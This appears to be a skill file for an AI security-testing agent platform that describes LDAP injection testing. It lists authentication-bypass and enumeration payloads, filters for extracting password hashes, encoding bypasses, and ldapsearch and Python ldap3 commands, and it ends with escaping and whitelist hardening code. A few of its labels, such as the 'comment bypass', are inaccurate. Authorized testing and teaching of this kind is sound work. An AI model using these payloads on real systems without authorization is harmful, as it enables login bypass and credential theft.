---
name: ldap-injection-testing
description: Specialized skill and methodology for testing LDAP injection vulnerabilities
version: 1.0.0
---

# LDAP Injection Testing

## Overview

LDAP injection is a vulnerability similar to SQL injection that exploits flaws in how LDAP queries are constructed, potentially leading to information disclosure, authentication bypass, and more. This skill covers detection, exploitation, and remediation of LDAP injection.

## Vulnerability Mechanics

Applications concatenate user input directly into LDAP queries without adequate validation and filtering, allowing attackers to alter the query logic.

**Vulnerable code example:**
```java
String filter = "(&(cn=" + userInput + ")(userPassword=" + password + "))";
ldapContext.search(baseDN, filter, ...);
```

## LDAP Basics

### Query Syntax

**Basic queries:**
```
(cn=John)
(objectClass=person)
(&(cn=John)(mail=john@example.com))
(|(cn=John)(cn=Jane))
(!(cn=John))
```

### Special Characters

**Characters that must be escaped:**
- `(` `)` - parentheses
- `*` - wildcard
- `\` - escape character
- `/` - path separator
- `NUL` - null character

## Testing Approach

### 1. Identify LDAP Input Points

**Common features:**
- User login
- User search
- Directory browsing
- Authorization checks

### 2. Basic Detection

**Test special characters:**
```
*)(&
*)(|
*))(
*))%00
```

**Test logical operators:**
```
*)(&(cn=*
*)(|(cn=*
*))(!(cn=*
```

### 3. Authentication Bypass

**Basic bypass:**
```
Username: *)(&
Password: *
Query: (&(cn=*)(&)(userPassword=*))
```

**More precise bypass:**
```
Username: admin)(&(cn=admin
Password: *))
Query: (&(cn=admin)(&(cn=admin)(userPassword=*)))
```

### 4. Information Disclosure

**Enumerate users:**
```
*)(cn=*
*)(uid=*
*)(mail=*
```

**Extract attributes:**
```
*)(|(cn=*)(userPassword=*
*)(|(objectClass=*)(cn=*
```

## Exploitation Techniques

### Authentication Bypass

**Method 1: Logic bypass**
```
Input: *)(&
Query: (&(cn=*)(&)(userPassword=*))
Result: matches all users
```

**Method 2: Comment bypass**
```
Input: admin)(&(cn=admin
Query: (&(cn=admin)(&(cn=admin)(userPassword=*)))
```

**Method 3: Wildcards**
```
Input: *)(|(cn=*)(userPassword=*
Query: (&(cn=*)(|(cn=*)(userPassword=*)(userPassword=*))
```

### Information Disclosure

**Enumerate all users:**
```
Search: *)(cn=*
Result: returns every cn attribute
```

**Extract password hashes:**
```
Search: *)(|(cn=*)(userPassword=*
Result: returns users and password hashes
```

**Extract sensitive attributes:**
```
Search: *)(|(cn=*)(mail=*)(telephoneNumber=*
Result: returns multiple sensitive attributes
```

### Privilege Escalation

**Alter the query logic:**
```
Original: (&(cn=user)(memberOf=CN=Users,DC=example,DC=com))
Injection: user)(memberOf=CN=Admins,DC=example,DC=com))(|(cn=user
Result: may bypass authorization checks
```

## Bypass Techniques

### Encoding Bypass

**URL encoding:**
```
*)(& → %2A%29%28%26
*)(| → %2A%29%28%7C
```

**Unicode encoding:**
```
* → \u002A
( → \u0028
) → \u0029
```

### Comment Bypass

**Using comments:**
```
*)(&(cn=*
*)(|(cn=*
```

### Null-Byte Injection

**Using NULL bytes:**
```
*))%00
```

## Tooling

### JXplorer

**Graphical LDAP client:**
- Connect to LDAP servers
- Browse the directory tree
- Run test queries

### ldapsearch

```bash
# Basic query
ldapsearch -x -H ldap://target.com -b "dc=example,dc=com" "(cn=*)"

# Test injection
ldapsearch -x -H ldap://target.com -b "dc=example,dc=com" "(cn=*)(&"
```

### Burp Suite

1. Intercept LDAP query requests
2. Modify query parameters
3. Observe the responses

### Python Script

```python
import ldap3

server = ldap3.Server('ldap://target.com')
conn = ldap3.Connection(server, authentication=ldap3.SIMPLE,
                        user='cn=admin,dc=example,dc=com',
                        password='password')

# Test injection
filter_str = '*)(&'
conn.search('dc=example,dc=com', filter_str)
print(conn.entries)
```

## Verification and Reporting

### Verification Steps

1. Confirm the LDAP query can be controlled
2. Verify the authentication bypass or information disclosure
3. Assess the impact (unauthorized access, data exposure, etc.)
4. Document a complete PoC
5. Record confirmed vulnerabilities in the platform via the `report_finding` tool (the single entry point for recording vulnerabilities on this platform); fields cover location, type, severity, reproduction steps/PoC, and remediation advice

### Reporting Essentials

- Vulnerability location and input parameters
- How the LDAP query was constructed
- Full exploitation steps and PoC
- Remediation advice (input validation, parameterized queries, etc.)

## Hardening

### Recommendations

1. **Input validation**
   ```java
   private static final String[] LDAP_ESCAPE_CHARS = 
       {"\\", "*", "(", ")", "\0", "/"};
   
   public static String escapeLDAP(String input) {
       if (input == null) {
         return null;
       }
       StringBuilder sb = new StringBuilder();
       for (int i = 0; i < input.length(); i++) {
         char c = input.charAt(i);
         if (Arrays.asList(LDAP_ESCAPE_CHARS).contains(String.valueOf(c))) {
           sb.append("\\");
         }
         sb.append(c);
       }
       return sb.toString();
   }
   ```

2. **Parameterized queries**
   ```java
   // Use the LDAP API's parameterized-query support
   String filter = "(&(cn={0})(userPassword={1}))";
   Object[] args = {escapedCN, escapedPassword};
   // Build the query through the API
   ```

3. **Whitelist validation**
   ```java
   // Allow only specific characters
   if (!input.matches("^[a-zA-Z0-9@._-]+$")) {
       throw new IllegalArgumentException("Invalid input");
   }
   ```

4. **Least privilege**
   - Run the LDAP connection under a least-privilege account
   - Restrict which attributes can be queried
   - Use access control lists

5. **Error handling**
   - Do not return detailed error messages
   - Use uniform error responses
   - Log errors

## Notes

- Test only in authorized environments
- Mind syntax differences across LDAP servers
- Avoid disrupting the directory while testing
- Understand the target LDAP server's configuration
